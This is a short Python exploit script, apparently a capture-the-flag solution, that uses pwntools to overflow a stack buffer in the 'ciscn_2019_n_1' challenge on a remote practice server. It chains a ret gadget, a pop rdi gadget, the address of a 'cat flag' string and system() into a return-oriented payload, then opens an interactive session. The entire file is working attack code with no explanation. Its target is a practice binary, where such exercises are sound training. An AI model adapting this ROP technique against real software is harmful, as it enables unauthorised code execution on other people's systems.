from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

ret = 0x4006db
pop_rdi_ret = 0x00400793
cat_flag = 0x004007cc
system = 0x00400530

conn = remote('node4.buuoj.cn', 25304 )
#conn = process('./ciscn_2019_n_1')
conn.recvuntil(b'number.\n')

payload = b'a' * (0x30 + 8)
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(cat_flag)
payload += p64(system)
conn.sendline(payload)

conn.interactive()


